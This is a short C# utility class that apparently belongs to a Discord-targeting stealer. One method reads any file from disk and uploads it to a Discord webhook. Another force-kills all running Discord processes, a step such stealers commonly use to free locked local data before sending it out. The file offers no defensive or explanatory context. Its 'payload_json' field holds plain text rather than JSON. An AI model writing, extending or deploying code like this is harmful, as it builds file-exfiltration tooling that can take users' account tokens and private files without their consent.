using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

namespace DiscordHook
{
    public static class Utility
    {
        public static void SendFileHook(string dshook, FileInfo file)
        {
            if (!file.Exists) return;
            var bound = "------------------------" + DateTime.Now.Ticks.ToString("x");
            var webhookRequest = new WebClient();
            webhookRequest.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);
            var stream = new MemoryStream();
            var beginBodyBuffer = Encoding.UTF8.GetBytes("--" + bound + "\r\n");
            stream.Write(beginBodyBuffer, 0, beginBodyBuffer.Length);
            
            var fileBody = "Content-Disposition: form-data; name=\"file\"; filename=\"" + file.Name + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
            var fileBodyBuffer = Encoding.UTF8.GetBytes(fileBody);
            stream.Write(fileBodyBuffer, 0, fileBodyBuffer.Length);
            byte[] fileBuffer;
            try
            {
                fileBuffer = File.ReadAllBytes(file.FullName);
            }
            catch 
            {
                return;
            }
            
            stream.Write(fileBuffer, 0, fileBuffer.Length);
            var fileBodyEnd = "\r\n--" + bound + "\r\n";
            var fileBodyEndBuffer = Encoding.UTF8.GetBytes(fileBodyEnd);
            stream.Write(fileBodyEndBuffer, 0, fileBodyEndBuffer.Length);
            
            var jsonBody = string.Concat("Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n", "File\r\n", "--", bound, "--");
            var jsonBodyBuffer = Encoding.UTF8.GetBytes(jsonBody);
            stream.Write(jsonBodyBuffer, 0, jsonBodyBuffer.Length);
            webhookRequest.UploadData(dshook, stream.ToArray());
        }

        public static void KillDiscord()
        {
            var ps = Process.GetProcessesByName("discord");
            foreach (var process in ps)
            {
                process.Kill();
            }
        }
    }
}
